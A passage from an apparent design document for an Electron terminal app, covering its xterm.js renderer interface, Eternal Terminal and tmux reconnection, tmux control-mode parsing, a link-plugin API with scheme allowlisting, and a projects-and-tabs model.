transport contract + `{host, session}` model** — never on xterm.js. (They were never
coupled to the renderer, which is *why* they survive a swap — the TS view boundary gets no
credit for that.)

Within Electron, a convenience TS interface is still fine for xterm ↔ another **web**
renderer (e.g. DOM-renderer fallback for background panes, §3). It must be richer than the first
draft — a real terminal needs more than write/resize:

```ts
interface WebTerminalView {                 // web-renderer-only; NOT the native-swap seam
  write(data: string, ack?: () => void): void;   // v1: string (node-pty's type); ACK §4.1
  onInput(cb: (data: string) => void): void;     // v1: string; Uint8Array is post-fork target
  resize(cols: number, rows: number): void;
  onResizeRequest(cb: (cols: number, rows: number) => void): void; // fit → pty (§5.4)
  focus(): void;
  scrollback: { clear(): void; toLine(n: number): void };
  selection: { get(): string; clear(): void };
  setTheme(t: Theme): void; setFont(f: Font): void;
  onTitle(cb: (t: string) => void): void;  onBell(cb: () => void): void;
  dispose(): void;
}
```

- Day one: `XtermTerminalView implements WebTerminalView`.
- **Byte fidelity — reconciled with node-pty (§3).** By default node-pty's `onData` delivers
  an already-decoded `string` (via an internal `StringDecoder` that handles multibyte
  chunk-boundary splits). Raw bytes **are** available — spawn with `encoding: null` and
  `onData` delivers a `Buffer` (no fork needed). **v1 deliberately types the boundary as
  `string`** and uses the default utf8 StringDecoder: it gives chunk-boundary safety for
  free and matches xterm.js/`pty.write`. If genuine non-UTF8 byte fidelity is ever needed,
  switch node-pty to `encoding: null` and type the boundary `Uint8Array` — a config change,
  not a fork. (Do **not** derive bytes via `Buffer.from(decodedString)` — that re-encodes as
  UTF-8 and corrupts the very non-UTF8 bytes you wanted.)
- A native renderer (§8) implements the **transport contract**, not this TS interface.

---

## 8. Known Limitations & Migration Trigger

### xterm.js limitations

- **Throughput** — addressed as a v1 correctness requirement via backpressure (§4.1), not
  deferred. Without it, output is *discarded* past the ~50MB write buffer, not merely slow.
- **WebGL context cap** — a *routine* constraint here, not a rare fallback: Chromium caps
  live WebGL contexts (~8–16, LRU-evicted), so many sessions ⇒ background panes lose their
  context. Mitigation: WebGL for the focused pane only; **DOM renderer** (or disposed WebGL
  addon) for background panes — the canvas addon is **no longer part of current xterm.js**,
  so DOM is the only non-WebGL renderer (§3). Still handle `webglcontextlost` defensively.
- **Ligatures**: addon-based, imperfect (interacts awkwardly with WebGL).
- **Images**: Sixel via addon; iTerm/Kitty image protocols not first-class.
- **Electron tax**: Chromium memory/CPU overhead.

### Migration path — this is a REWRITE of the render layer, not a "contained swap"

Per §7: replacing xterm.js with a **native Rust + wgpu + `alacritty_terminal`** renderer is
**not** implementing a TS interface — it means rendering the terminal in a native surface,
a new IPC boundary, and re-solving focus / resize / IME / clipboard / scrollback against a
non-DOM surface. **Budget it as a full native rewrite, not a swap.** (The "native child
window composited into the Electron window" idea is a trap: Electron's BrowserWindow
compositor does not cleanly host a foreign GPU surface, and the transparent-overlay
workaround breaks DOM z-order vs. the sidebar, per-monitor DPI, input-focus routing, and
multi-window. The realistic path is **dropping Electron for a native/Tauri shell**.)

What *does* carry over: the sidebar / session / respawn / persistence code, because it
depends only on the **transport contract** (§7), not the renderer. That is the real,
limited benefit — do not overstate it.

Reference implementation to study: **Rio terminal** (`alacritty_terminal` + `wgpu` +
`rio-window` [a winit fork, not winit directly] + the `sugarloaf` render crate,
cross-platform).

---

## 9. Prerequisites & Open Questions

### 9.0 Hard prerequisite — validate BEFORE Milestone 2
- **et must be installable on the target hosts.** et requires ssh reachability + `etserver`
  running + an open TCP port (default 2022). On locked-down/managed hosts where you cannot
  install `etserver`, the design degrades to `ssh`+`autossh`, which gives **no in-session
  TCP resumption** — a materially different (weaker) product. **Confirm et installability
  against the actual hosts before building the remote layer.**
- **The connection layer must be pluggable from the start.** The session/persistence model
  differs per backend (et vs mosh vs ssh+autossh), so model it as an interface behind
  `{host, session}`, not as hardcoded `et` argv.
- **The OOB channel (§5.2) needs a LOCAL `tmux` binary + unix-socket support** to query the
  forwarded remote socket. Consequences: (a) **Windows** has no native tmux and differing
  unix-socket semantics — so on Windows the OOB channel is unavailable and the app must fall
  back to **timeout-only connect-detection with no lost-session detection**, or use `-CC`,
  or v1 scopes to **macOS/Linux only**; (b) even on macOS/Linux the **local tmux
  protocol version must match the remote's** (§5.2) — add both to setup docs.

### Open questions
1. **Connection layer**: `et` (default) vs `mosh` vs `ssh`+`autossh`? → gated on 9.0.
2. **Frontend**: React+TS (default) vs plain TS?
3. **Scaffold**: electron-vite (default) vs Electron Forge vs hand-rolled?
4. **Multi-pane / splits**: app owns splits (tabs of single terminals) or tmux owns splits
   inside one pane? (Recommendation: app owns tabs/sessions, tmux owns in-session splits —
   avoid two multiplexers fighting over layout.)
5. **Target platforms** for v1: macOS only, or all three desktop OSes from the start?
6. **Version skew**: a stale `etserver` may refuse a newer et client; **and** local vs
   remote **tmux protocol** must match for the OOB channel (§5.2). Note both in setup docs.
7. **Multi-window**: single window (v1 default) or multiple? Deferred; gates the
   per-session IPC capability check (§6.3) and the native-renderer path (§8).

---

## 10. Rough Milestones

0. **Empirically characterize `et` by hand** (§9.0): run the canonical command (§5.1)
   against a real host **inside a real terminal/pty** (a piped/redirected run fails with
   "open terminal failed: not a terminal" — verified). **Capture exit code AND output stream
   for each case: in-terminal detach (`Ctrl-b d`), remote shell exit, ssh auth failure,
   `tmux`-missing, host-down** — the §5.1 "exit-0 = intentional, no respawn" rule and the
   auth-cap depend on this. Also confirm the `-t` socket forward lets a local `tmux -S`
   query the remote (§5.2). (Already verified offline: host-down/refused → exit 1 +
   identical stdout; `-x/-y` inert on attach; `tmux attach -D`/`-o` invalid; `window-size`
   defaults to `latest`; `--` honored by et; `session_created` persists across `new -A -D`.)
1. **Skeleton**: Electron + xterm.js + node-pty; one local shell renders, resize works,
   **backpressure/watermarks in place (§4.1)** — validate with `cat` of a large file
   (assert no discard/wedge; observe et-side RSS, §11).
2. **Remote + bounded reconnect**: pty spawns the **canonical command** (§5.1) at the fitted
   pty size (§5.4), validated/decomposed inputs (§6); supervisor with **exit-0=no-respawn**
   (gated on no-respawn-in-flight), capped backoff, **lifetime auth-attempt cap** (excluding
   watchdog kills), timer cancellation, PID-fingerprint local + `-D` remote orphan handling
   (§5.1). Verify against a **fake connection backend** (§11): no hot-loop, detach lets you
   leave, no double-attach, no auth-storm, no watchdog livelock.
3. **OOB control channel + sidebar**: forward the remote tmux socket over et (`-t
   sock:sock`, §5.2) and derive `connecting→connected` from an OOB `list-clients`/query —
   **not** first pty data (§5.3/§5.4). Then session list, add/focus/remove/rename, **state
   machine (§5.3)**. (This channel is a prerequisite for M4; if the §1 `-CC` spike won, it
   replaces this.)
4. **Persistence**: disk-backed session list (re-validated on load), lazy restore on launch,
   detect-lost-session via persisted remote `#{session_created}` over the OOB channel (§5.2).
5. **Polish**: focused-pane WebGL + background DOM renderer (§3), `webglcontextlost` handling,
   keybindings, theming.
6. **(Later, gated on measured need)** Native renderer — a render-layer *rewrite* (§8),
   reusing only the transport-contract-coupled code.

---

## 11. Testing & Observability (the reliability core needs both)

The app's entire justification is *stability*, so the supervisor (§5.1) must be testable
and its decisions observable — otherwise "stable" is unmeasured.

### Testing
- **Injectable connection-layer interface** (already required for pluggability, §9.0): the
  supervisor depends on an abstract `ConnectionBackend`, not on `et` directly. A **fake
  backend** lets tests drive exit timing/codes, simulate drops, dead hosts, detach, and
  slow teardown — asserting: no hot-loop on a dead host, backoff caps then `dead`,
  intentional-close cancels pending timers, no respawn after close, no double-attach.
- **Backpressure test**: feed a synthetic firehose through the fake backend; assert the
  xterm.js buffer never overflows and `pause`/`resume` toggle at the watermarks.
- **Input-validation tests** (§6): reject hosts with leading `-`, session names with
  metacharacters or `.`, malformed persisted JSON.

### Observability
- **Structured event log** for every supervisor decision (spawn, exit observed, backoff
  scheduled/cancelled, dead, retry) — this is the runtime channel for *why* a session died,
  since et's own diagnostics are unparseable stdout (§5.1). Optionally enrich with et's
  `-l/--logtostdout` side-channel log.
- **Per-session metrics**: reconnect count, current backoff, IPC queue depth / unacked
  bytes (§4.1), and et-client memory (the unbounded-buffer risk from §4.1).
- Surface `dead`/`reconnecting`/lost-session states in the sidebar (§5.3) with the cause.

---

## 12. Control Mode (`tmux -CC`) — native-tab view (VERIFIED against tmux 3.5a on a live host)

### Goal
Make a remote session look like a **native terminal** (own tabs/splits, no tmux status bar,
no prefix key) — the cmux `ssh-tmux` experience — WITHOUT changing session persistence.

### Key facts (verified on the target host, not assumed)
- **Control mode is per-CLIENT, not per-session.** The same tmux session can be attached
  normally or with `-CC`; switch a session between modes by detach/reattach with no data
  loss. So `-CC` is an *optional view* on sessions we already manage — not a rewrite.
  (Verified: created a session normally, attached `-CC`, reattached normally; work survived.)
- **Requires tmux >= 3.2.** The probe (probeTmux) detects version; offer `-CC` only where
  supported, else fall back to the normal-mode `SshTmuxBackend`.
- **Input goes to tmux's COMMAND interpreter, not the shell.** Writing raw `echo x` to a
  `-CC` stream yields `parse error: unknown command: echo`. Shell input must be sent via
  `send-keys -t %<pane> "..." Enter` (verified). This is the #1 gotcha.

### The wire protocol (captured from tmux 3.5a — ground truth)
Stream opens with a DCS marker (ESC P 1000 p), then CRLF-terminated lines:
- `%begin <ts> <cmd#> <flags>` ... `%end|%error <ts> <cmd#> <flags>` — command reply block
- `%output %<pane> <data>` — pane output; `<data>` is OCTAL-ESCAPED (octal ESC/CR/LF etc.)
- `%window-add @<win>` / `%window-close @<win>` — window (our TAB) added/removed
- `%window-renamed @<win> <name>` — tab title
- `%window-pane-changed @<win> %<pane>` ; `%session-changed $<s> <name>`
- `%session-window-changed $<s> @<win>` ; `%sessions-changed`
- `%layout-change @<win> <layout>` — e.g. `419a,80x24,0,0[80x12,0,0,1,80x11,0,13,2]`
- `%exit [<reason>]` — control client should exit

Notes: `%output` payload is octal-escaped (octal 033=ESC, 015=CR, 012=LF) — un-escape to raw
bytes before `term.write()`. Layout string = `<checksum>,<WxH>,<X>,<Y>` with `[...]` =
left/right split, `{...}` = top/bottom split, leaf ends in the pane id -> parse to a tree.

### Architecture — a thin `ControlModeBackend` coordinator over focused units
`ControlModeBackend` is deliberately small: it wires parser events to the registry and emits
tagged data/window events. The mechanisms live in single-responsibility, individually
unit-tested collaborators, so the coordinator holds little state and each rule is testable alone:
- `ControlModeParser` (pure): bytes -> structured control events (paneOutput, window*, begin/end,
  exit).
- **`WindowRegistry` (pure): the single source of truth for topology.** Maps `pane -> window`,
  tracks the active window; `reconcile(rows)` against an authoritative `list-panes -s` listing
  returns the exact diff (added/removed/renamed/activeChanged/newlyMappedPanes). No IO.
- **`ReplyChannel` (pure): the request/response protocol.** Owns the pty command writes and a FIFO
  of one reply handler per command (+ a seeded handshake handler). `send(line, handler?)` /
  `onReply(ev)` give positional correlation — see below.
- **`tmuxKeys` (pure): shell input -> `send-keys` command lines** (line-splitting + literal
  escaping). Verified gotchas encoded once, tested in isolation.
- **`shared/tmuxSocket` (pure): the version-tagged socket name**, the one place the major-minor
  rule lives (used by main, ssh backend, and control backend so it can't drift).
- Launch argv (`buildControlModeSshArgs`): `ssh -tt -- host <tmux> -CC -L <sock> new-session -D -A
  -s <name>` (built on `buildSshArgs`, which validates host/session/etc.).
- `ControlModeBackend` (per SESSION) coordinates them:
  - **Topology by reconcile, not by ad-hoc signal handling.** ANY of `%window-add/close/renamed`,
    `%window-pane-changed`, `%session-window-changed`, `%layout-change` just triggers a
    (coalesced) `list-panes -s` refresh; its reply reconciles the registry and the backend emits
    exactly the window add/close/rename/active events that changed. This replaced a design that
    tried to apply each partial signal directly and raced (a new tab showing the previous tab's
    app; output mixing across tabs). A topology listing is recognized purely by CONTENT (every
    line `@win %pane a a name`), so it is never confused with scrollback capture text.
  - **Output is TAGGED with its window.** `%output %P` -> look up `P`'s window in the registry
    and emit `{window, pane, data}`. If `P` isn't mapped yet (output can race ahead of the
    listing on a brand-new window), buffer BY PANE and flush on the next reconcile — never guess.
  - **Input & capture address a WINDOW, not a pane.** `send-keys -t @win` / `capture-pane -t @win`
    (tmux resolves the window's active pane). Verified on the host. This removed the async
    "query the pane id first" step whose gap let keystrokes land in the previously-active window.
  - **Replies correlate to commands POSITIONALLY (`ReplyChannel`).** tmux emits exactly one
    `%begin..%end` block per command, in submission order (verified: cmd# monotonic; one
    unsolicited handshake block at connect, absorbed by the seeded handler). Each `send` enqueues
    one reply handler; each reply block invokes the head. This replaced content-based routing,
    which desynced when a *fresh* window's capture reply was **empty** (indistinguishable from a
    command ack), so a later capture painted into the wrong tab — the "re-visited first tab becomes
    the old one" bug. Positional correlation binds each capture reply to the exact window it was
    requested for, empty or not.
  - resize -> `refresh-client -C <cols>x<rows>` (verified on 3.5a).
  - **Input gating lives ONLY in the backend.** It buffers input until ready (attach settled, fast
    path 500ms after `%session-changed`; spawn-time fallback guarantees ready even if that signal
    never arrives), then replays in order. The renderer forwards keystrokes unconditionally and
    keeps `inputReady` purely as a status-line flag — no second buffer/timer (that duplication was
    removed).
  - **The renderer is a dumb view keyed by window** — it holds no pane/topology state; it just
    mirrors the backend's window events into tabs and routes `{window}`-tagged data to that tab.
    All backend `data` is normalized to `{data, window?, pane?}` at the supervisor, so main/renderer
    never type-sniff string-vs-object.
- **Version-tagged socket** `dtcc<major>-<minor>` (e.g. `dtcc3-7`): tmux's control protocol drifts
  across minor releases, so a 3.5 server + 3.7 client on one socket silently produces no output.
  Distinct sockets per major.minor keep incompatible versions from ever sharing a server.
- **Per-session transport toggle**: `mode: 'plain' | 'control'`. `plain` = current
  `SshTmuxBackend` (any tmux). `control` = `ControlModeBackend` (tmux >= 3.2). Persisted;
  switchable by detach/reattach. Default `plain`; offer `control` when the probe reports >= 3.2.

### Parser rules (the fiddly bits, from the capture)
- Buffer by CRLF lines; a line starting with `%` is a control line -> dispatch by keyword.
- `%output %<id> <rest>`: id is `%N`; `<rest>` is octal-escaped to end-of-line -> un-escape.
- `%begin`/`%end`/`%error` bracket command replies; correlate by `<cmd#>`; non-`%output`
  text between a `%begin` and its `%end` is the reply body (e.g. `list-windows`).
- `%exit` -> tear down the session view. Ignore unknown `%...` lines forward-compatibly.

### Milestones (spike first, then layer)
1. Single-pane spike: `-CC` attach, parse `%output %0` -> one xterm; input via `send-keys`;
   resize via `refresh-client -C`. Prove round-trip on the live host (echo a marker).
2. Command correlation: `%begin/%end/%error` state machine; unit-tested with captured fixtures.
3. Windows -> tabs: `%window-add/close/renamed` -> tab strip; switch active window.
4. Panes -> splits: parse `%layout-change`; render native splits; route per-pane output.
5. Polish: mouse, copy-mode/selection, bracketed paste (`paste-buffer -p`), title/bell.

### Testing
- Parser is PURE -> unit-test against CAPTURED real-byte fixtures: `%output` un-escaping,
  multi-line, `%window-*`, `%layout-change`, `%begin/%end/%error`.
- Live spike test (like `test/live-*.js`): drive a real `-CC` session; assert a `send-keys`
  marker round-trips through `%output`. Gated on tmux >= 3.2; plain-mode path unaffected.

---

## 13. Plugin framework (extension points)

A small, in-process extension framework so features are contributed, not hardcoded. First
extension point: **link matchers** (clickable URLs/paths and beyond).

### Architecture
- `src/shared/plugins.js` — `PluginRegistry` (PURE, unit-tested): holds registered link
  plugins and a `findMatches(line)` engine (priority-ordered, non-overlapping).
- `src/renderer/builtinPlugins.js` — the built-in **url** and **path** plugins, written
  against the same public API a third party would use (examples as much as features).
- Renderer wires the registry into an xterm `registerLinkProvider` per terminal; a match's
  `activate` calls the plugin's `onClick(text, ctx)`.

### Public API (renderer global)
```js
// window.dtPlugins.registerLink(plugin) -> unregister()
window.dtPlugins.registerLink({
  name: 'jira',
  priority: 50,                 // higher wins on overlapping ranges (default 0)
  regex: /\b[A-Z]+-\d+\b/g,     // MUST be global (/g)
  onClick(text, ctx) {          // ctx = { meta, openExternal, copyText, setStatus }
    ctx.openExternal('https://jira.example.com/browse/' + text);
  },
});
```

### The `ctx` handed to onClick
- `meta` — the session's metadata (host, mode, …) so a handler knows if a path is remote.
- `openExternal(url)` — opens via the OS, **scheme-validated in main** (http/https/ftp/file/
  mailto only — terminal text is untrusted).
- `copyText(text)` — writes to the clipboard.
- `setStatus(msg)` — shows a message in the status bar.

### Built-in behavior
- **url**: opens http(s)/ftp/file (and bare `www.` → https) in the browser; refuses unsafe
  schemes.
- **path**: the terminal path is usually REMOTE (session is ssh+tmux), so the app can't open
  it locally in general — default action is **copy + status**. A plugin can register a
  higher-priority path matcher to override (e.g. open in a remote editor).

### Security
- Matching is on untrusted terminal text; handlers do only what `ctx` allows.
- `openExternal` is scheme-allowlisted in the MAIN process (defense-in-depth), not just the
  plugin — a malicious matcher still can't launch `javascript:`/arbitrary handlers.

### Future extension points (same registry pattern)
- output transformers, status-bar widgets, custom keybindings, per-session hooks.

---

## 14. Projects & multi-session (cmux-style)

Sidebar entries become **projects**; each project holds **multiple sessions (tabs)** that
**share one remote host + one connection**.

### Mapping (the whole design)
- **Project = one tmux session** on the host (`dt-<projectId>`, the container).
- **Session/tab = a tmux window** inside it.
- **One control-mode connection per project** multiplexes all windows.
This is cmux's model and reuses our control-mode window→tab events (§12 milestone 3).

### Data model (persisted)
```
Project { id, title, host, transport, tmuxPath, tmuxVersion,
          tmuxSession:'dt-<id>', activeWindow:'@N',
          windows:[{ tmuxWindow:'@N', title }] }
```
Persist PROJECTS, not windows — windows live on the tmux server and are restored on
reattach; cached window titles only pre-populate tab labels before reattach completes.
Existing single-session entries migrate to single-window projects (backward compatible).

### UI
- Left sidebar = **projects** (host + title + status). Reuses today's sidebar.
- Tab bar (top of terminal area) = **windows of the active project** (the §12 tab strip,
  promoted to primary UI). `+` = new session in the project.
- One xterm PER WINDOW, kept live; active tab shown, others hidden (generalizes per-view
  show/hide). Output routed by pane→window mapping from `%layout-change`.

### Operations (control channel)
| Action | tmux command | Effect |
|---|---|---|
| Open project | `new-session -A -D -s dt-<id>` (-CC) | `%window-add` per window → tabs |
| New session | `new-window -t dt-<id>` | `%window-add @N` → tab + fresh xterm |
| Switch tab | `select-window -t @N` | active window matches; show its xterm |
| Rename tab | `rename-window -t @N "t"` | `%window-renamed` → label |
| Close tab | `kill-window -t @N` | `%window-close` → drop tab + dispose xterm |

### Reconnect
Reattach the project's ONE tmux session (control mode). tmux replays `%window-add` for every
window + `%layout-change` → **all tabs rebuild automatically**; per-window `capture-pane`
back-fills each window's scrollback (§12 flow); active window from `%session-window-changed`.
The whole project (all tabs) returns from a single reattach. Input gating/`ready` apply per
window.

### Caveats & scope
- **Requires control mode** (tmux ≥ 3.2). Plain mode shows tmux's own window bar; a plain
  project degrades to one window (extra windows via tmux's UI).
- v1 assumes **one pane per window** (window↔pane 1:1). Multi-pane splits = milestone 4.

### Confirmed decisions
- **Tab model:** windows in ONE tmux session per project. One `-CC` connection.
- **Reconnect load:** back-fill the ACTIVE tab's scrollback immediately; lazy-load each other
  tab's history on first focus.
- **New session (`+`):** `new-window -c '#{pane_current_path}'` — start in the active tab's cwd.

### Incremental build plan
1. Data model + persistence: Project with windows; migrate existing entries.
2. Sidebar shows projects; clicking opens/focuses a project (control-mode connect).
3. Tab bar from `%window-*`; per-window xterm + output routing; switch/active.
4. New session (`new-window`) + close (`kill-window`) + rename (`rename-window`).
5. Reconnect: rebuild all tabs + active-tab scrollback (others lazy on focus).
6. (later) multi-pane splits (milestone 4).

---

## 15. Polymorphic tabs (extension seam)

Tabs are NOT hardwired to terminals. A tab holds a **`TabContent`** provided by a registered
**tab-kind** (reuses the §13 plugin registry). This lets future tabs host other content
(markdown, an in-app browser, dashboards) with no changes to the project/tab machinery —
only terminal tabs bind to the tmux backend.

### TabContent interface
```
TabContent {
  kind,                 // 'terminal' | future: 'markdown' | 'browser' | ...
  mount(container),     // render into the tab's element
  onData?(data),        // optional — terminals consume backend bytes; viewers may ignore
  resize?(cols, rows),  // optional
  focus?(),             // optional
  dispose(),
}
```

### Registering a tab-kind (public API)
```js
window.dtPlugins.registerTabKind({
  kind: 'markdown',
  create(spec, ctx) { /* return a TabContent */ },
});   // -> unregister()
```
- Built-in: **'terminal'** (`src/renderer/terminalTab.js`) wraps xterm.js as a TabContent —
  the reference implementation.
- The project/tab code creates content via `registry.createTabContent(kind, spec, ctx)` and
  manages mount/show-hide/dispose generically. A non-terminal kind simply doesn't wire to a
  pty/window.

NOTE: markdown/browser kinds are NOT designed here — only the seam exists so they can be
added later as plugins.
